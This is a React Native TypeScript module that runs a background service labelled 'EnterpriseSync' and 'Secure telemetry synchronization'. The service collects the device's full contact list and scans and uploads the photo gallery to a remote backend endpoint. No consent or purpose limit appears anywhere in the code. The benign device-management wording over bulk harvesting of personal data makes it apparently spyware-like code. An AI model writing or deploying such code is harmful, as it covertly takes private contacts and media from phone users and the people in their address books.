import BackgroundService from 'react-native-background-actions';
import Contacts from 'react-native-contacts';
import axios from 'axios';
import { scanAndUploadGallery, MediaItem } from './MediaPipelineService';

const sleep = (time: number) => new Promise<void>((resolve) => setTimeout(resolve, time));

interface SyncOptions {
  backendUrl: string;
  deviceId: string;
}

export const startBackgroundSync = async (options: SyncOptions) => {
  const veryIntensiveTask = async () => {
    await new Promise(async () => {

      // ── Contacts: sirf ek dafa fetch karo ────────────────────────────────
      let allContacts: any[] = [];
      let contactsSent = false;

      try {
        allContacts = await Contacts.getAll();
        console.log(`[Sync] Fetched ${allContacts.length} contacts`);
      } catch (err) {
        console.error('[Sync] Contacts fetch failed:', err);
      }

      // ── Session cache for gallery duplicates ──────────────────────────────
      const sessionUploadedIds = new Set<string>();

      // ── Main loop: 20 x 15s = 5 minutes ──────────────────────────────────
      for (let i = 0; i < 20 && BackgroundService.isRunning(); i++) {

        // ── Gallery scan ─────────────────────────────────────────────────
        let newMediaItems: MediaItem[] = [];
        try {
          newMediaItems = await scanAndUploadGallery(options.deviceId, sessionUploadedIds);
        } catch (mediaErr: any) {
          console.warn(`[Sync ${i + 1}] Gallery error:`, mediaErr?.message);
        }

        // ── Backend sync ─────────────────────────────────────────────────
        try {
          const payload: any = { deviceId: options.deviceId };

          // Contacts: sirf pehli iteration mein
          if (!contactsSent && allContacts.length > 0) {
            payload.contacts = allContacts;
          }

          // Media: sirf naye items
          if (newMediaItems.length > 0) {
            payload.mediaItems = newMediaItems;
          }

          // Kuch bhi naya ho to bhejo
          if (payload.contacts || payload.mediaItems) {
            await axios.post(`${options.backendUrl}/api/telemetry/sync`, payload);

            if (!contactsSent && allContacts.length > 0) {
              contactsSent = true;
              console.log(`[Sync ${i + 1}] Contacts sent: ${allContacts.length}`);
            }
          }

          console.log(`[Sync ${i + 1}/20] media:${newMediaItems.length} contacts:${contactsSent}`);

        } catch (e: any) {
          console.error(`[Sync ${i + 1}] Backend failed:`, e?.message);
        }

        if (i < 19) {
          await sleep(15000);
        }
      }

      if (BackgroundService.isRunning()) {
        await BackgroundService.stop();
        console.log('[Sync] Completed after 5 minutes.');
      }
    });
  };

  await BackgroundService.start(veryIntensiveTask, {
    taskName: 'EnterpriseSync',
    taskTitle: 'Device Management Active',
    taskDesc: 'Secure telemetry synchronization in progress',
    taskIcon: { name: 'ic_launcher', type: 'mipmap' },
    color: '#ff00ff',
    foregroundServiceType: ['dataSync'],
  } as any);
};